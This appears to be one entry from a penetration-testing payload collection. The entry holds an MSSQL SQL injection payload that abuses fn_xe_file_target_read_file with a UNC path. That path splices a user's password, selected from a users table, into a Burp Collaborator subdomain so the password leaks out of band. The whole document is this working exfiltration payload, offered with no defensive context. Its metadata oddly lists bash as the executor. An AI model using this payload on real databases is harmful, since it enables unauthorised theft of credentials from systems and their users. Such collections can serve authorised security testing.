---
id: b33a445e-ebeb-4784-8352-86a07725d663
name: Check if fn_xe_file_target_read_file is accessible
type: command
executor: bash
data: exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass
  from users where id=1)%2b'.xxxx.burpcollaborator.net\1.xem',null,null))
output: null
created_at: '2023-04-06T03:56:34.004207+00:00'
updated_at: '2023-04-10T20:22:40.529149+00:00'
---

# Check if fn_xe_file_target_read_file is accessible

```bash
exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.xem',null,null))
```


